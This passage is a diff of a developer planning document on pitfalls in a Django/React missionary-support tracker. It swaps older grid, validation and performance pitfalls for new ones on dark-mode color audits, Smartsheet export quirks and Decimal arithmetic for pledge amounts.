+Dark mode audit reveals that existing components (not just new ones) have hard-coded colors. The JournalHeader component uses `bg-card` and `text-muted-foreground` correctly (JournalHeader.tsx:56-57), but other pages use patterns like `className="font-medium"` without explicit color (inherits correctly) mixed with `className="text-sm text-gray-500"` (hard-coded gray, may not contrast well in dark mode). The audit scope creeps from "review new features" to "fix all existing pages," consuming the entire quality audit phase.
 
-**Why it happens:** Binary "completed" state (checkmark vs empty) doesn't encode recency. 3-month-old meeting completion looks identical to yesterday's. Users assume visual confirmation means "current/active" not "ever happened."
+**Why it happens:**
+The dark mode implementation uses Tailwind CSS variables (`bg-background`, `text-foreground`, `bg-card`, `text-muted-foreground`, etc.) defined in globals.css with both `:root` and `.dark` variants. Components that use shadcn/ui primitives get this for free. But custom code that uses raw Tailwind utilities (`text-gray-500`, `bg-white`, `border-gray-200`) bypasses the theme system. The temptation to fix EVERYTHING during the quality audit leads to massive diffs and potential regressions.
 
-**Consequences:**
-- Missionaries deprioritize truly active contacts, focus on stale ones
-- Reports show "90% meeting completion" but half are 6+ months old
-- Loss of trust in the tool: "The journal doesn't show what's actually happening"
-- Decision-making based on misleading visual indicators
+**How to avoid:**
+1. Scope the dark mode audit to a checklist, not open-ended exploration
+2. Categorize issues as "broken" (unusable in dark mode) vs "imperfect" (slightly wrong shade)
+3. Fix only "broken" issues in v1.3; track "imperfect" as tech debt
+4. Use automated grep to find hard-coded colors:
 
-**Prevention:**
-```typescript
-// BAD - Binary checkmark with no freshness indicator
-const StageCell = ({ completed }: { completed: boolean }) => {
-  return <div>{completed ? '✓' : ''}</div>;
-};
-
-// GOOD - Encode freshness in visual design
-const StageCell = ({
-  completed,
-  timestamp
-}: {
-  completed: boolean;
-  timestamp: Date | null
-}) => {
-  if (!completed) return <div className="text-gray-300">—</div>;
-
-  const daysAgo = timestamp
-    ? Math.floor((Date.now() - timestamp.getTime()) / (1000 * 60 * 60 * 24))
-    : null;
-
-  // Visual freshness encoding
-  const freshnessClass = daysAgo === null ? 'text-gray-400' :
-    daysAgo < 7 ? 'text-green-600' :      // Recent (< 1 week)
-    daysAgo < 30 ? 'text-yellow-600' :    // Aging (1 week - 1 month)
-    daysAgo < 90 ? 'text-orange-600' :    // Stale (1-3 months)
-    'text-red-400';                        // Very stale (3+ months)
-
-  return (
-    <div className="flex items-center gap-1">
-      <span className={freshnessClass}>✓</span>
-      {daysAgo !== null && (
-        <span className="text-xs text-gray-500">
-          {daysAgo < 7 ? `${daysAgo}d` :
-           daysAgo < 30 ? `${Math.floor(daysAgo / 7)}w` :
-           daysAgo < 90 ? `${Math.floor(daysAgo / 30)}mo` :
-           `${Math.floor(daysAgo / 30)}mo`}
-        </span>
-      )}
-    </div>
-  );
-};
-
-// Backend: Include freshness warnings in API response
-class JournalContactSerializer(serializers.ModelSerializer):
-    stages = serializers.SerializerMethodField()
-
-    def get_stages(self, obj):
-        stages_data = {}
-        for stage_event in obj.stage_events.all():
-            days_since = (timezone.now() - stage_event.created_at).days
-
-            stages_data[stage_event.stage] = {
-                'completed': True,
-                'timestamp': stage_event.created_at.isoformat(),
-                'days_ago': days_since,
-                'is_stale': days_since > 90,  # Flag for business logic
-                'staleness_level': (
-                    'fresh' if days_since < 7 else
-                    'aging' if days_since < 30 else
-                    'stale' if days_since < 90 else
-                    'very_stale'
-                )
-            }
-        return stages_data
+```bash
+# Find potential dark mode issues in components
+grep -rn "text-gray-\|bg-gray-\|text-white\|bg-white\|border-gray-\|text-black\|bg-black" \
+  frontend/src/pages/ frontend/src/components/ \
+  --include="*.tsx" --include="*.ts" \
+  | grep -v node_modules | grep -v ".test."
 ```
 
-**Detection:**
-- User feedback: "I followed up on contacts marked complete but they were dead ends"
-- Analytics showing low conversion despite high stage completion rates
-- Variance between "stage complete timestamp" and "last activity timestamp"
+5. For each finding, check if the semantic equivalent exists:
 
-**Phase:** Phase 3 (Grid UI) — design visual language for freshness from mockups
+| Hard-coded | Semantic Equivalent |
+|-----------|-------------------|
+| `text-gray-500` | `text-muted-foreground` |
+| `bg-white` | `bg-background` or `bg-card` |
+| `border-gray-200` | `border-border` |
+| `text-gray-900` | `text-foreground` |
+| `bg-gray-50` | `bg-muted` |
+| `bg-gray-100` | `bg-secondary` |
 
-**Alternative approach:** Add "Activity Age" column showing days since last stage event, color-coded. Gives missionary quick scan for which contacts are active vs stale.
+**Warning signs:**
+- Audit scope expanding from "v1.3 features" to "all pages"
+- No predefined checklist or pass/fail criteria
+- Dark mode "fixes" introducing visual regressions in light mode
+- Large PRs that mix feature work with dark mode fixes
+
+**Phase to address:**
+Phase 5 (Quality audit) -- define scope and pass/fail criteria BEFORE starting the audit. Limit to pages touched in v1.3 + any page where text is invisible in dark mode.
 
 **Sources:**
-- [Stale Data: How to Identify and Mitigate](https://www.acceldata.io/blog/how-to-identify-and-eliminate-stale-data-to-optimize-business-decisions)
-- [Data Freshness Best Practices](https://www.elementary-data.com/post/data-freshness-best-practices-and-key-metrics-to-measure-success)
-- [PatternFly Stale Data Warning](https://www.patternfly.org/component-groups/status-and-state-indicators/stale-data-warning/)
+- [Dark Mode - Tailwind CSS](https://tailwindcss.com/docs/dark-mode)
+- [Simple dark mode support with Tailwind and CSS variables](https://invertase.io/blog/tailwind-dark-mode)
+- globals.css in this project (`:root` and `.dark` CSS variable definitions)
 
-## Moderate Pitfalls
+---
 
-Mistakes that cause delays or technical debt.
+### Pitfall 10: Smartsheet Exports Include Hidden Columns and Checkbox Booleans as "True"/"False" Strings
 
-### Pitfall 6: Sequential Pipeline Enforcement Too Rigid or Too Loose
+**What goes wrong:**
+User exports a Smartsheet that has hidden columns. They expect hidden columns to be excluded, but Smartsheet includes them in the export unless the user explicitly unhides and filters. The column mapping UI shows 30 columns when the user expected 10, confusing them. Additionally, Smartsheet checkbox columns export as literal strings `"True"` and `"False"` (not Python booleans), and dropdown/contact-list columns export as plain text. Date columns may export as text strings if the Smartsheet column type was "Text/Number."
 
-**What goes wrong:** Business rule is "sequential-but-flexible" (warn on skip, don't block). Implementation is either too rigid (blocks skip → missionary can't record reality) or too loose (no warning → bad data accumulates silently).
+**Why it happens:**
+Per [Smartsheet's export documentation](https://help.smartsheet.com/articles/770623-exporting-sheets-reports-from-smartsheet): "Excel doesn't support dropdown, contact list, checkbox, and symbols columns; only text values are exported." Hidden data IS included unless unhidden before export. This is a Smartsheet platform behavior, not a bug in parsing code.
 
-**Why it happens:** Validation logic confuses "warning" with "error." Backend returns 400 status for skip attempt, frontend interprets as blocking error. Or: validation disabled entirely because requirements said "flexible."
+**How to avoid:**
+1. Show ALL columns in the mapping UI (don't hide columns with unusual names)
+2. Add a "Skip this column" option in the mapper (not every column needs to map)
+3. Handle `"True"`/`"False"` strings as boolean values for checkbox-sourced columns
+4. Show column preview with first 3 row values so user can identify column content
+5. Document Smartsheet export instructions in the import dialog:
 
-**Consequences:**
-- Too rigid: Missionary can't log "Contact ghosted before meeting" (stage skip blocked)
-- Too loose: Journal fills with nonsensical data (Decision made before Contact stage)
-- Support tickets: "System won't let me save" or "How did this contact skip 4 stages?"
+```typescript
+// In SmartsheetImportDialog step 1
+<Alert>
+  <AlertTitle>Preparing your Smartsheet export</AlertTitle>
+  <AlertDescription>
+    <ul className="list-disc pl-4 space-y-1 text-sm">
+      <li>Go to File > Export > Export to Excel</li>
+      <li>Hidden columns will be included -- unhide only the ones you need</li>
+      <li>Checkbox columns will appear as "True" or "False" text</li>
+      <li>Date columns should use Smartsheet's Date column type for best results</li>
+    </ul>
+  </AlertDescription>
+</Alert>
+```
 
-**Prevention:**
+**Warning signs:**
+- Users complaining "too many columns" in mapping UI
+- Boolean fields importing as text strings "True" instead of Python `True`
+- Date parsing failures on columns that looked fine in Smartsheet
+
+**Phase to address:**
+Phase 2 (Column mapping UI) -- UX design must account for messy real-world exports, not clean test files
+
+**Sources:**
+- [Smartsheet Export Documentation](https://help.smartsheet.com/articles/770623-exporting-sheets-reports-from-smartsheet)
+- [Smartsheet Excel Export without hidden columns](https://community.smartsheet.com/discussion/144142/excel-export-without-hidden-columns)
+
+---
+
+### Pitfall 11: Float Arithmetic in monthly_equivalent Creates Penny Errors in Filter Results
+
+**What goes wrong:**
+The existing `Pledge.monthly_equivalent` property (pledges/models.py:138-146) uses float arithmetic: `float(self.amount) * multipliers.get(self.frequency, 1)` where multipliers are `1/3`, `1/6`, `1/12`. This is known tech debt from EDGE_CASE_AUDIT.md section 3.1. When adding filters that display pledge totals or filter by pledge amount ranges, the float errors compound: filtering contacts by "monthly support > $100" might exclude a contact with 3 quarterly $100 pledges because `100 * 1/3 * 3 = 99.99999999999999` instead of `100.00`.
+
+**Why it happens:**
+The property returns `float`, and `Contact.monthly_pledge_amount` (contacts/models.py:144-149) sums these floats in a Python loop. The error was minor when displaying a single value but becomes a filter correctness issue when used in queryset annotations or range comparisons.
+
+**How to avoid:**
+Fix the root cause in the quality audit phase:
 ```python
-# BAD - Blocking validation
-def create_stage_event(contact, journal, stage):
-    current_stage_index = STAGE_ORDER.index(contact.current_stage)
-    new_stage_index = STAGE_ORDER.index(stage)
+# pledges/models.py -- FIXED
+@property
+def monthly_equivalent(self):
+    """Calculate monthly equivalent for support tracking."""
+    multipliers = {
+        PledgeFrequency.MONTHLY: Decimal('1'),
+        PledgeFrequency.QUARTERLY: Decimal('1') / Decimal('3'),
+        PledgeFrequency.SEMI_ANNUAL: Decimal('1') / Decimal('6'),
+        PledgeFrequency.ANNUAL: Decimal('1') / Decimal('12'),
+    }
+    result = self.amount * multipliers.get(self.frequency, Decimal('1'))
+    return result.quantize(Decimal('0.01'))  # Round to cents
+```
 
-    if new_stage_index > current_stage_index + 1:
-        raise ValidationError("Cannot skip stages")  # Blocks save
+For filter backend, compute monthly equivalent in SQL to avoid Python float issues:
+```python
+from django.db.models import Case, When, F, DecimalField, Value
 
-    StageEvent.objects.create(...)
-
-# GOOD - Non-blocking warning with metadata
-STAGE_ORDER = ['CONTACT', 'MEET', 'ASK', 'DECISION', 'THANK', 'NEXT_STEPS']
-
-def create_stage_event(contact, journal, stage):
-    current_stage_index = STAGE_ORDER.index(contact.current_stage)
-    new_stage_index = STAGE_ORDER.index(stage)
-
-    # Calculate skip severity
-    stages_skipped = new_stage_index - current_stage_index - 1
-    is_skip = stages_skipped > 0
-    is_backward = new_stage_index < current_stage_index
-
-    # Create event with warning metadata (doesn't block save)
-    event = StageEvent.objects.create(
-        contact=contact,
-        journal=journal,
-        stage=stage,
-        metadata={
-            'stages_skipped': stages_skipped,
-            'is_skip': is_skip,
-            'is_backward': is_backward,
-            'skip_severity': 'high' if stages_skipped > 2 else 'low'
-        }
+Contact.objects.annotate(
+    monthly_support=Sum(
+        Case(
+            When(pledges__frequency='monthly', then=F('pledges__amount')),
+            When(pledges__frequency='quarterly', then=F('pledges__amount') / Value(3)),
+            When(pledges__frequency='semi_annual', then=F('pledges__amount') / Value(6)),
+            When(pledges__frequency='annual', then=F('pledges__amount') / Value(12)),
+            output_field=DecimalField(max_digits=10, decimal_places=2),
+        ),
+        filter=Q(pledges__status='active')
     )
-
-    # Optional: Create warning event in audit log
-    if is_skip:
-        Event.objects.create(
-            type='stage_skip_warning',
-            message=f"Skipped {stages_skipped} stage(s): {contact.name}",
-            severity='warning'
-        )
-
-    return event
-
-# Frontend shows warning but allows save
-const handleStageUpdate = async (stage: string) => {
-  const response = await updateStage({ contactId, journalId, stage });
-
-  if (response.metadata?.is_skip) {
-    toast.warning(
-      `Warning: Skipped ${response.metadata.stages_skipped} stage(s). ` +
-      `Consider logging intermediate stages for accurate tracking.`,
-      { duration: 5000 }
-    );
-  }
-
-  // Save succeeds regardless of warning
-};
+).filter(monthly_support__gte=Decimal('100'))
 ```
 
-**Detection:**
-- Support tickets about "can't save stage"
-- Analytics showing 0% stage skip rate (suggests overly rigid validation)
-- Analytics showing 40%+ skip rate (suggests too loose, bad data quality)
+**Warning signs:**
+- Filter results excluding contacts that should match
+- Dashboard totals not matching sum of individual pledge amounts
+- Test assertions using `assertAlmostEqual` instead of exact comparison
 
-**Phase:** Phase 2 (Stage Events) — define warning vs error semantics in requirements
-
-**Guideline:** Block only impossible states (e.g., stage doesn't exist). Warn on unusual patterns (skip, backward). Let user override all warnings.
-
-**Sources:**
-- [Data Validation in ETL - 2026 Guide](https://www.integrate.io/blog/data-validation-etl/)
-- [Validation Pipelines - Explanation & Examples](https://www.secoda.co/glossary/validation-pipelines)
+**Phase to address:**
+Phase 5 (Quality audit) -- fix Decimal arithmetic BEFORE Phase 3 (filtering backend) if filters will use pledge amounts
 
 ---
 
-### Pitfall 7: Grid Virtualization Not Enabled for >50 Rows
-
-**What goes wrong:** Grid renders all 200 contacts × 7 columns = 1400 DOM nodes on page load. Browser becomes sluggish, scrolling lags, mobile devices crash.
-
-**Why it happens:** React table libraries default to rendering all rows. Developer assumes library handles virtualization automatically. Only 10 rows visible at once, but 190 rows rendered offscreen consuming memory.
-
-**Consequences:**
-- Page load time: 4+ seconds for 200-contact grid
-- Scrolling framerate drops to 20 FPS (should be 60)
-- Mobile Safari crashes with "page unresponsive" error
-- Accessibility tools (screen readers) choke on 1400 elements
-
-**Prevention:**
-```typescript
-// BAD - No virtualization
-import { useReactTable, getCoreRowModel } from '@tanstack/react-table';
-
-const JournalGrid = ({ contacts }: { contacts: Contact[] }) => {
-  const table = useReactTable({
-    data: contacts,  // All 200 rows rendered
-    columns,
-    getCoreRowModel: getCoreRowModel(),
-  });
-
-  return (
-    <div>
-      {table.getRowModel().rows.map(row => (
-        <GridRow key={row.id} row={row} />  // 200 DOM nodes
-      ))}
-    </div>
-  );
-};
-
-// GOOD - Virtualization with TanStack Virtual
-import { useReactTable, getCoreRowModel } from '@tanstack/react-table';
-import { useVirtualizer } from '@tanstack/react-virtual';
-
-const JournalGrid = ({ contacts }: { contacts: Contact[] }) => {
-  const table = useReactTable({
-    data: contacts,
-    columns,
-    getCoreRowModel: getCoreRowModel(),
-  });
-
-  const parentRef = useRef<HTMLDivElement>(null);
-
-  const rowVirtualizer = useVirtualizer({
-    count: table.getRowModel().rows.length,
-    getScrollElement: () => parentRef.current,
-    estimateSize: () => 60,  // Row height in pixels
-    overscan: 10,  // Render 10 rows above/below viewport for smooth scrolling
-  });
-
-  return (
-    <div ref={parentRef} style={{ height: '600px', overflow: 'auto' }}>
-      <div style={{ height: `${rowVirtualizer.getTotalSize()}px`, position: 'relative' }}>
-        {rowVirtualizer.getVirtualItems().map(virtualRow => {
-          const row = table.getRowModel().rows[virtualRow.index];
-          return (
-            <GridRow
-              key={row.id}
-              row={row}
-              style={{
-                position: 'absolute',
-                top: 0,
-                left: 0,
-                width: '100%',
-                height: `${virtualRow.size}px`,
-                transform: `translateY(${virtualRow.start}px)`,
-              }}
-            />
-          );
-        })}
-      </div>
-    </div>
-  );
-};
-```
-
-**Detection:**
-- Chrome DevTools Performance: "Long task" warnings during scroll
-- React DevTools Profiler: 1000+ components rendered
-- Lighthouse report: "Avoid enormous network payloads" (if fetching all 200 contacts)
-
-**Phase:** Phase 3 (Grid UI) — enable virtualization before testing with realistic data volume
-
-**Threshold:** Enable virtualization when rows exceed viewport capacity. For 60px row height and 600px viewport: 10 visible rows → virtualize at 50+ total rows.
-
-**Sources:**
-- [React Data Grid Performance - KendoReact](https://www.telerik.com/kendo-react-ui/components/grid/performance)
-- [Virtual Scrolling/Virtualization](https://js.devexpress.com/React/Documentation/Guide/UI_Components/DataGrid/Enhance_Performance_on_Large_Datasets/)
-
----
-
-### Pitfall 8: Decision History Queries Without Pagination
-
-**What goes wrong:** Contact has 50 decision updates over 2 years. Opening decision history panel fetches all 50 records, renders 50 table rows, takes 3 seconds to load. Most users only care about recent 5-10.
-
-**Why it happens:** "History" implies "show everything." Developer queries `DecisionHistory.objects.filter(decision=decision).all()` without limit. Works fine with 3 history records during testing. Breaks in production with real usage.
-
-**Consequences:**
-- Decision panel slow to open (bad UX)
-- Large payload size (50 records × verbose JSON = 100KB response)
-- Database query scans full history table instead of using LIMIT
-
-**Prevention:**
-```python
-# BAD - Fetch all history
-class DecisionHistoryViewSet(viewsets.ReadOnlyModelViewSet):
-    def list(self, request, decision_pk=None):
-        history = DecisionHistory.objects.filter(
-            decision_id=decision_pk
-        ).order_by('-changed_at')  # Could be 100+ records
-
-        serializer = DecisionHistorySerializer(history, many=True)
-        return Response(serializer.data)
-
-# GOOD - Paginate with default limit
-class DecisionHistoryViewSet(viewsets.ReadOnlyModelViewSet):
-    pagination_class = StandardPagination  # Default 25 per page
-
-    def list(self, request, decision_pk=None):
-        # Recent-first ordering
-        history = DecisionHistory.objects.filter(
-            decision_id=decision_pk
-        ).select_related('decision__contact').order_by('-changed_at')
-
-        # Pagination handled by DRF
-        page = self.paginate_queryset(history)
-        serializer = DecisionHistorySerializer(page, many=True)
-        return self.get_paginated_response(serializer.data)
-
-# Frontend: Infinite scroll for history
-const DecisionHistoryPanel = ({ decisionId }: { decisionId: string }) => {
-  const {
-    data,
-    fetchNextPage,
-    hasNextPage,
-    isFetchingNextPage,
-  } = useInfiniteQuery({
-    queryKey: ['decisionHistory', decisionId],
-    queryFn: ({ pageParam = 1 }) =>
-      fetchDecisionHistory(decisionId, { page: pageParam }),
-    getNextPageParam: (lastPage) => lastPage.next ? lastPage.page + 1 : undefined,
-  });
-
-  return (
-    <div>
-      {data?.pages.map(page =>
-        page.results.map(historyItem => (
-          <HistoryRow key={historyItem.id} item={historyItem} />
-        ))
-      )}
-
-      {hasNextPage && (
-        <button onClick={() => fetchNextPage()} disabled={isFetchingNextPage}>
-          Load More History
-        </button>
-      )}
-    </div>
-  );
-};
-```
-
-**Detection:**
-- Network tab showing >100KB JSON responses for history endpoint
-- Slow query logs showing `SELECT * FROM decision_history WHERE decision_id = X` without LIMIT
-- User complaint: "History takes forever to load"
-
-**Phase:** Phase 2 (Decision Tracking) — design history API with pagination from start
-
-**Guideline:** Default to 25 most recent history records. Provide "Load More" or infinite scroll for older history. 90% of usage views recent 5-10 records only.
-
----
-
-### Pitfall 9: Event Sourcing Signal Handlers Creating Infinite Loops
-
-**What goes wrong:** StageEvent creation triggers signal → signal updates JournalContact.current_stage → save() triggers Contact post_save signal → creates another StageEvent → infinite loop.
-
-**Why it happens:** Django signals fire on every save(). Event sourcing creates events on state changes. State changes trigger saves. Without proper signal guards, circular dependencies emerge.
-
-**Consequences:**
-- RecursionError: maximum recursion depth exceeded
-- Database deadlocks from concurrent signal processing
-- Event table fills with duplicate events
-- Production outage requiring database rollback
-
-**Prevention:**
-```python
-# BAD - No signal guard
-@receiver(post_save, sender=StageEvent)
-def update_current_stage(sender, instance, created, **kwargs):
-    if created:
-        journal_contact = JournalContact.objects.get(
-            contact=instance.contact,
-            journal=instance.journal
-        )
-        journal_contact.current_stage = instance.stage
-        journal_contact.save()  # Triggers JournalContact post_save signal!
-
-@receiver(post_save, sender=JournalContact)
-def log_stage_change(sender, instance, **kwargs):
-    StageEvent.objects.create(  # Creates new StageEvent!
-        contact=instance.contact,
-        journal=instance.journal,
-        stage=instance.current_stage
-    )
-    # INFINITE LOOP
-
-# GOOD - Signal guards with update() and created flag
-@receiver(post_save, sender=StageEvent)
-def update_current_stage(sender, instance, created, **kwargs):
-    if created:  # Only process new events, not updates
-        # Use update() instead of save() to skip signals
-        JournalContact.objects.filter(
-            contact=instance.contact,
-            journal=instance.journal
-        ).update(
-            current_stage=instance.stage,
-            last_stage_change=instance.created_at
-        )
-
-# Alternative: Explicit signal control
-from django.db.models.signals import post_save
-
-def update_decision_with_history(decision, amount, cadence):
-    # Manually disconnect signal before save
-    post_save.disconnect(create_decision_event, sender=Decision)
-
-    try:
-        decision.amount = amount
-        decision.save()
-
-        # Manually create event (signal won't fire)
-        StageEvent.objects.create(...)
-    finally:
-        # Reconnect signal
-        post_save.connect(create_decision_event, sender=Decision)
-```
-
-**Detection:**
-- Server logs showing RecursionError stack traces
-- Database showing duplicate events with identical timestamps
-- Pytest tests hanging indefinitely on signal-triggering operations
-
-**Phase:** Phase 1 (Data Model) — design signal architecture before implementing event sourcing
-
-**Guideline:** Prefer explicit event creation over implicit signals for event sourcing. Signals are useful for audit logging, but create/update separation should be manual in business logic.
-
-**Sources:**
-- [Event-Driven Architectures with Django](https://www.scoutapm.com/blog/event-driven-architectures-with-django)
-
----
-
-### Pitfall 10: Grid State Management Without Optimistic Updates
-
-**What goes wrong:** User clicks to mark stage complete → request sent to backend → user waits 500ms staring at unchanged grid → response returns → grid updates. Feels sluggish and unresponsive.
-
-**Why it happens:** Standard React Query pattern waits for server response before updating UI. Works for forms, but grids require instant feedback for good UX.
-
-**Consequences:**
-- User clicks multiple times thinking first click didn't register (double/triple submit)
-- Grid feels "laggy" compared to Google Sheets or Airtable
-- Poor perceived performance even when actual latency is low
-
-**Prevention:**
-```typescript
-// BAD - No optimistic update
-const StageCell = ({ contactId, stage, completed }: StageCellProps) => {
-  const updateMutation = useMutation({
-    mutationFn: (data) => updateStageEvent(contactId, stage, data),
-    onSuccess: () => {
-      queryClient.invalidateQueries(['journalGrid']);  // Refetch after success
-    },
-  });
-
-  const handleToggle = () => {
-    updateMutation.mutate({ completed: !completed });
-    // UI doesn't update until onSuccess callback fires (500ms delay)
-  };
-
-  return <div onClick={handleToggle}>{completed ? '✓' : ''}</div>;
-};
-
-// GOOD - Optimistic update with rollback on error
-const StageCell = ({ contactId, journalId, stage, completed }: StageCellProps) => {
-  const queryClient = useQueryClient();
-
-  const updateMutation = useMutation({
-    mutationFn: (data) => updateStageEvent(contactId, journalId, stage, data),
-
-    // Update UI immediately before request completes
-    onMutate: async (newData) => {
-      // Cancel ongoing queries to avoid overwriting optimistic update
-      await queryClient.cancelQueries(['journalGrid', journalId]);
-
-      // Snapshot current state for rollback
-      const previousData = queryClient.getQueryData(['journalGrid', journalId]);
-
-      // Optimistically update cache
-      queryClient.setQueryData(['journalGrid', journalId], (old: any) => {
-        return old.map((contact: any) =>
-          contact.id === contactId
-            ? {
-                ...contact,
-                stages: {
-                  ...contact.stages,
-                  [stage]: {
-                    ...contact.stages[stage],
-                    completed: newData.completed,
-                    timestamp: new Date().toISOString(),
-                  }
-                }
-              }
-            : contact
-        );
-      });
-
-      return { previousData };  // Return context for rollback
-    },
-
-    // Rollback on error
-    onError: (err, newData, context) => {
-      queryClient.setQueryData(['journalGrid', journalId], context?.previousData);
-      toast.error('Failed to update stage. Changes reverted.');
-    },
-
-    // Refetch to sync with server truth
-    onSettled: () => {
-      queryClient.invalidateQueries(['journalGrid', journalId]);
-    },
-  });
-
-  const handleToggle = () => {
-    updateMutation.mutate({ completed: !completed });
-    // UI updates instantly, then syncs with server
-  };
-
-  return (
-    <div
-      onClick={handleToggle}
-      className={updateMutation.isLoading ? 'opacity-50' : ''}
-    >
-      {completed ? '✓' : ''}
-    </div>
-  );
-};
-```
-
-**Detection:**
-- User feedback: "Grid feels slow" despite <500ms backend response times
-- Analytics showing high rate of duplicate API calls (user clicking multiple times)
-
-**Phase:** Phase 3 (Grid UI) — implement optimistic updates for all grid mutations
-
-**Guideline:** Any grid cell mutation (stage toggle, decision update) should use optimistic updates. Forms and modals can wait for server response. Grids require instant feedback.
-
-## Minor Pitfalls
-
-Mistakes that cause annoyance but are fixable.
-
-### Pitfall 11: Hover Tooltips Without Debounce
-
-**What goes wrong:** User moves mouse across grid, hover tooltip fetches event timeline for every cell, creates 20 API requests in 2 seconds, tooltip flickers rapidly.
-
-**Why it happens:** Tooltip shows event details on hover. Developer binds fetch to `onMouseEnter` without debounce. Rapid mouse movement triggers fetch spam.
-
-**Consequences:**
-- Tooltip content flashes as requests race
-- Network tab shows 50+ concurrent requests
-- Backend rate limiter may block user
-- Annoying UX (tooltip appears/disappears rapidly)
-
-**Prevention:**
-```typescript
-// BAD - Immediate fetch on hover
-const StageCell = ({ contactId, stage }: StageCellProps) => {
-  const [showTooltip, setShowTooltip] = useState(false);
-  const { data: events } = useQuery({
-    queryKey: ['stageEvents', contactId, stage],
-    queryFn: () => fetchStageEvents(contactId, stage),
-    enabled: showTooltip,  // Fetches immediately on hover
-  });
-
-  return (
-    <div
-      onMouseEnter={() => setShowTooltip(true)}
-      onMouseLeave={() => setShowTooltip(false)}
-    >
-      {/* Tooltip content */}
-    </div>
-  );
-};
-
-// GOOD - Debounced hover with delay
-import { useDebouncedValue } from '@/hooks/useDebouncedValue';
-
-const StageCell = ({ contactId, stage }: StageCellProps) => {
-  const [isHovered, setIsHovered] = useState(false);
-  const debouncedHover = useDebouncedValue(isHovered, 300);  // 300ms delay
-
-  const { data: events } = useQuery({
-    queryKey: ['stageEvents', contactId, stage],
-    queryFn: () => fetchStageEvents(contactId, stage),
-    enabled: debouncedHover,  // Only fetch if hover sustained for 300ms
-    staleTime: 60000,  // Cache for 1 minute
-  });
-
-  return (
-    <div
-      onMouseEnter={() => setIsHovered(true)}
-      onMouseLeave={() => setIsHovered(false)}
-    >
-      {debouncedHover && events && (
-        <Tooltip events={events} />
-      )}
-    </div>
-  );
-};
-
-// Debounce utility hook
-export const useDebouncedValue = <T,>(value: T, delay: number): T => {
-  const [debouncedValue, setDebouncedValue] = useState(value);
-
-  useEffect(() => {
-    const handler = setTimeout(() => {
-      setDebouncedValue(value);
-    }, delay);
-
-    return () => clearTimeout(handler);
-  }, [value, delay]);
-
-  return debouncedValue;
-};
-```
-
-**Detection:**
-- Network tab showing burst of 20+ requests when moving mouse across grid
-- Backend logs showing spike in tooltip endpoint hits
-- User complaint: "Tooltip keeps disappearing"
-
-**Phase:** Phase 3 (Grid UI) — add debounce to hover interactions
-
-**Guideline:** 300ms debounce for hover tooltips. Cache tooltip data for 1 minute to avoid refetch on re-hover.
-
----
-
-### Pitfall 12: Exporting CSV Without Streaming for Large Journals
-
-**What goes wrong:** User clicks "Export CSV" for 500-contact journal → backend queries all 500 contacts + events + decisions into memory → serializes 5MB CSV → browser download. Takes 20 seconds, times out on slow connections.
-
-**Why it happens:** Export implemented as single endpoint returning full CSV file. Works fine with 50 contacts. Breaks with 500+ due to memory/timeout constraints.
-
-**Consequences:**
-- Export timeout (30-second Gunicorn timeout)
-- Backend memory spike (500 contacts × 10 events each = 5000 objects in memory)
-- Browser hangs waiting for download
-
-**Prevention:**
-```python
-# BAD - Load all data into memory
-from django.http import HttpResponse
-import csv
-
-def export_journal_csv(request, journal_id):
-    journal = Journal.objects.get(pk=journal_id)
-
-    # Loads all 500 contacts + related data into memory
-    contacts = Contact.objects.filter(
-        journals=journal
-    ).prefetch_related('stage_events', 'decisions')
-
-    response = HttpResponse(content_type='text/csv')
-    writer = csv.writer(response)
-
-    for contact in contacts:  # 500 iterations in memory
-        writer.writerow([contact.name, contact.email, ...])
-
-    return response
-
-# GOOD - Streaming response with iterator
-from django.http import StreamingHttpResponse
-
-class Echo:
-    """An object that implements just the write method of the file-like interface."""
-    def write(self, value):
-        return value
-
-def export_journal_csv(request, journal_id):
-    journal = Journal.objects.get(pk=journal_id)
-
-    # Iterator-based queryset (doesn't load all into memory)
-    contacts = Contact.objects.filter(
-        journals=journal
-    ).prefetch_related('stage_events', 'decisions').iterator(chunk_size=100)
-
-    def csv_rows():
-        """Generator yielding CSV rows"""
-        pseudo_buffer = Echo()
-        writer = csv.writer(pseudo_buffer)
-
-        # Yield header
-        yield writer.writerow(['Name', 'Email', 'Current Stage', ...])
-
-        # Yield rows in chunks
-        for contact in contacts:
-            yield writer.writerow([
-                contact.name,
-                contact.email,
-                contact.current_stage,
-                ...
-            ])
-
-    response = StreamingHttpResponse(csv_rows(), content_type='text/csv')
-    response['Content-Disposition'] = f'attachment; filename="journal_{journal_id}.csv"'
-    return response
-```
-
-**Detection:**
-- Export endpoint taking >10 seconds for large journals
-- Backend memory usage spiking during export
-- Timeout errors in production logs
-
-**Phase:** Phase 4 (Reports) — implement streaming for CSV export
-
-**Threshold:** Use streaming response when export may exceed 1000 rows or 1MB file size.
-
----
-
-### Pitfall 13: Missing Indexes on Event Query Patterns
-
-**What goes wrong:** Query for "all stage events for contact X in journal Y" scans full events table (10M rows) instead of using index. Takes 5 seconds instead of 50ms.
-
-**Why it happens:** Developer adds `StageEvent` model with foreign keys but forgets composite index for common query pattern: `filter(contact=X, journal=Y).order_by('-created_at')`.
-
-**Consequences:**
-- Slow grid page loads (each contact queries events)
-- Database CPU spikes under concurrent users
-- Query timeout on large event tables
-
-**Prevention:**
-```python
-# BAD - No composite index
-class StageEvent(TimeStampedModel):
-    contact = models.ForeignKey(Contact, on_delete=models.CASCADE)
-    journal = models.ForeignKey(Journal, on_delete=models.CASCADE)
-    stage = models.CharField(max_length=50)
-    event_type = models.CharField(max_length=50)
-
-    class Meta:
-        ordering = ['-created_at']
-    # Missing: index for common query patterns
-
-# GOOD - Composite indexes for query patterns
-class StageEvent(TimeStampedModel):
-    contact = models.ForeignKey(Contact, on_delete=models.CASCADE, db_index=True)
-    journal = models.ForeignKey(Journal, on_delete=models.CASCADE, db_index=True)
-    stage = models.CharField(max_length=50, db_index=True)
-    event_type = models.CharField(max_length=50)
-
-    class Meta:
-        ordering = ['-created_at']
-        indexes = [
-            # Common query: latest event per contact per journal
-            models.Index(fields=['contact', 'journal', '-created_at'],
-                        name='stageevent_contact_journal_created'),
-
-            # Stage-specific queries
-            models.Index(fields=['journal', 'stage', '-created_at'],
-                        name='stageevent_journal_stage_created'),
-
-            # Timeline queries
-            models.Index(fields=['journal', '-created_at'],
-                        name='stageevent_journal_timeline'),
-        ]
-
-# Verify index usage with EXPLAIN ANALYZE
-# In Django shell:
-from django.db import connection
-from django.test.utils import CaptureQueriesContext
-
-with CaptureQueriesContext(connection) as queries:
-    events = StageEvent.objects.filter(
-        contact_id=contact_id,
-        journal_id=journal_id
-    ).order_by('-created_at')[:10]
